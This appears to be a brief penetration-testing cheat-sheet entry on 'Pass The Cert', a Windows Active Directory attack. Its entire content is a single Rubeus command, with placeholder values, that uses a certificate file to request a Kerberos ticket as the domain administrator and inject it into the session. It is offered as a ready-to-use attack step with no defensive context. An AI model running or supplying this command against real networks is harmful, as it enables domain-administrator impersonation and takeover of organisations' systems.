# Pass The Cert

### From windows

#### Rubeus

{% code overflow="wrap" %}
```powershell
./Rubeus.exe asktgt /user:<DOMAIN>\administrator /certificate:<PFX> /dc:<MACHINE> /password:<PASSWORD> /ptt
```
{% endcode %}

